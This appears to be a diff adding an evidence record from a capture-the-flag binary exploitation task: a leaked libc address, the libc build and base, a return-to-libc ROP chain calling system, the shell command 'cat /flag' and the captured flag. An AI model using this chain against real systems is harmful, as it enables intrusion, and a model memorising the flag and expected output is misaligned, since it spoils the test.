@@ -1,0 +1,17 @@
+Sanitized evidence shape
+
+stage=stage1
+target=183.238.63.200:45711
+puts_leak=0x7f3ebcaeb420
+libc_build=libc6_2.31-0ubuntu9.14_amd64
+libc_base=0x7f3ebca67000
+page_aligned=true
+
+stage=stage2
+chain=ret,pop_rdi,binsh,system
+shell_command=cat /flag
+flag=7a05d1dfc4bf420abba8956931189635
+done_marker=__CASE_DONE__
+
+assurance=reproducible_evidence
+source_artifact_sha256=0094d9e40edbc0401b5a85cf4908dc91efb627a6cc72c66d2dab833e8858a088
